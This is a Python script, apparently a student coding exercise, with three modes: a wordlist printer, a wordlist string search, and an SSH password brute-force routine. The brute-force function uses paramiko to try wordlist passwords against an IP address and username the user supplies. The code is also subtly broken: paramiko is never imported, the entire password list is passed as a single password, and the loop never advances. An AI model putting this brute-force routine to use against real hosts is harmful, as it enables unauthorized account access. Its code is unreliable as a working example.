#!/usr/bin/env python3
# Script Name:                 code challenge 13
# Author:                       Robert Gillespie
# Date of latest revision:      7/31/2023
# # Purpose:



import time

def iterator():
    # Prompt the user to enter the file path of the word list
    filepath = input("Enter the complete filepath for the wordlist: ")

    # Open the file specified by `filepath` in read mode
    with open(filepath, 'r') as file:
        # Iterate through each line in the file
        for line in file:
            # Remove any leading and trailing whitespace characters, including newline characters, from the current line
            word = line.strip()

            # Print the current word to the screen
            print(word)

            # Pause the execution of the script for one second using the `sleep()` function to introduce a delay between words
            time.sleep(1)

def password_recognized():
    # Prompt the user to enter the string to search for in the word list
    input_string = input("Enter the string to search: ")

    # Prompt the user to enter the file path of the word list
    filepath = input("Enter the complete filepath for the wordlist: ")

    # Open the file specified by `filepath` in read mode
    with open(filepath, 'r') as file:
        # Read the entire content of the file and check if `input_string` exists in the word list
        if input_string in file.read():
            # If `input_string` is found in the word list, print a message indicating its presence
            print(f"The string '{input_string}' appeared in the word list.")
        else:
            # If `input_string` is not found in the word list, print a message indicating that it was not found
            print(f"The string '{input_string}' did not appear in the word list.")
def sshbruteforce():
    # Get input from user
    host = input("Please provide an IP address to connect to: ")
    user = input("Please provide a username: ")
    filepath = input("Please provide file path to wordlist: ")
    port = 22

    with open(filepath, 'r') as file: 
        password=file.readlines() 
    while password:  

        try:
            # Create object of SSHClient and connect to SSH
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port, user, password)
    
            print(f"Login Successful with password {password}")
            break

        except paramiko.AuthenticationException as e:
            print("Authentication Failed!")
            print(e)

        ssh.close()

def main():
    print("Select one of the following modes:")
    print("Mode 1: Offensive; Dictionary Iterator")
    print("Mode 2: Defensive; Password Recognized")
    print("Mode 3: SSH; Bruteforce attack")
    # Prompt the user to enter the mode number (1 or 2)
    mode = input("Enter the mode number (1 or 2): ")

    if mode == "1":
        # If the user selects Mode 1 (Offensive), call the `iterator()` function
        iterator()
    elif mode == "2":
        # If the user selects Mode 2 (Defensive), call the `password_recognized()` function
        password_recognized()
    elif mode == "3":
        sshbruteforce()
    else:
        # If the user enters an invalid mode number, print an error message
        print("Invalid mode selected. Please choose either '1' or '2'.")

if __name__ == "__main__":
    # Check if the script is being executed directly (not imported as a module). If so, call the `main()` function to start the script's execution.
    main()

